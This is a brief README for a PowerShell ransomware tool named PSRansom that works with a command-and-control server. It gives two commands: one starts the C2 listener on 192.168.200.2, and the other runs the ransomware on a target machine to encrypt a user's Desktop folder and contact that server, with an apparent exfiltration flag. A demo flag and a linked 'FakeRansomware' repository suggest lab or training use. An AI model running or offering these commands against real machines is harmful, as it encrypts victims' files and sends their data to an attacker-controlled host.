# PSRansom
PSRansome - Powershell based Ransomeware with C2

STEP A. On C2 (192.168.200.2):

.\C2Server.ps1 * 80

STEP B. On Target Machine:

.\PSRansom.ps1 -e C:\Users\bob\Desktop\ -s 192.168.200.2 -p 80 -x -Demo


https://github.com/v3gard/FakeRansomware
